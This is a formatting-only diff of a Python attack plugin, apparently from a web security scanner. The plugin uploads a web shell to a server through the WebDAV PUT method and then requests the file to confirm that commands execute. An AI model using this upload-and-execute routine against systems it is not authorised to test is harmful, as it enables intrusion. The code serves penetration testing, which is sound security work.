@@ -58,7 +58,7 @@ class dav(AttackPlugin):
         Then the exploit plugin that exploits os_commanding
         ( attack.os_commanding ) should return 'os_commanding' in this method.
         """
-        return ['dav',]
+        return ['dav']
 
     def _generate_shell(self, vuln_obj):
         """
@@ -97,8 +97,7 @@ class dav(AttackPlugin):
             fname = '%s.%s' % (filename, extension)
             url_to_upload = vuln_obj.get_url().url_join(fname)
 
-            om.out.debug(
-                'Uploading file %s using PUT method.' % url_to_upload)
+            om.out.debug('Uploading file %s using PUT method.' % url_to_upload)
             self._uri_opener.PUT(url_to_upload, data=file_content)
 
             # Verify if I can execute commands
@@ -109,17 +108,17 @@ class dav(AttackPlugin):
             response = self._uri_opener.GET(exploit_url)
 
             if shell_handler.SHELL_IDENTIFIER in response.get_body():
-                msg = 'The uploaded shell returned the SHELL_IDENTIFIER, which'\
-                      ' verifies that the file was uploaded and is being' \
-                      ' executed.'
+                msg = ('The uploaded shell returned the SHELL_IDENTIFIER, which'
+                       ' verifies that the file was uploaded and is being'
+                       ' executed.')
                 om.out.debug(msg)
                 self._exploit_url = exploit_url
                 return True
             else:
-                msg = 'The uploaded shell with extension: "%s" did NOT return'\
-                      ' the SHELL_IDENTIFIER, which means that the file was'\
-                      ' not uploaded to the remote server or the code is not'\
-                      ' being run. The returned body was: "%s".'
+                msg = ('The uploaded shell with extension: "%s" did NOT return'
+                       ' the SHELL_IDENTIFIER, which means that the file was'
+                       ' not uploaded to the remote server or the code is not'
+                       ' being run. The returned body was: "%s".')
                 om.out.debug(msg % (extension, response.get_body()))
                 extension = ''
 
